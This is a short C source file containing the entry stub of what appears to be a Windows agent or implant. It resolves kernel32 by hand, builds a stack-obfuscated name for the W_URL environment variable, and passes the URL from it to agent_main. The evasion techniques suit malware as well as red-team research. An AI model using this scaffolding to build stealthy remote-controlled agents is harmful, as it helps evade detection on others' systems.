#include "entry.h"
#include "kernel32.h"
#include "logger.h"
#include "environment.h"
#include "string.h"
#include "stackstrings.h"



__attribute__((section(".text"), used))
void entry(void)
{
    KERNEL32 entry_k32;
    if (!KERNEL32_Ctor(&entry_k32))
        return;

    CHAR env_name[8];
    StrEnvUrl(env_name);

    CHAR url_arg[2048];
    if (GetVariable(env_name, url_arg, sizeof(url_arg)) == 0) {
        LOG_ERROR("Environment variable W_URL not set");
        return;
    }

    WCHAR url_arg_w[2048];
    if (AnsiToWide(url_arg, url_arg_w, 2048) < 0) {
        LOG_ERROR("Environment variable W_URL is invalid");
        return;
    }

    INT32 rc = agent_main(url_arg_w);
    entry_k32.ExitProcess((UINT32)rc);
}
